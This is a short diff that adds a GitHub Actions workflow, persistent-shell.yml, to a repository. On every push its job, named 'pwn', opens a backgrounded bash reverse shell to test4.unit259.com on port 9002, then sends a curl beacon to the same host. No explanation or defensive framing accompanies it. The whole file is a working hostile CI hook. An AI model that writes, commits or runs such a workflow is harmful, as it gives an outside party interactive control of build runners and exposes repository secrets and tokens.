@@ -1,0 +1,12 @@
+# .github/workflows/persistent-shell.yml
+on:
+  push:
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Reverse shell to tunnel
+        run: |
+          bash -c 'bash -i >& /dev/tcp/test4.unit259.com/9002 0>&1' &
+      - name: Beacon so you know job reached here
+        run: curl -s https://test4.unit259.com/log?prefix=shell-beacon
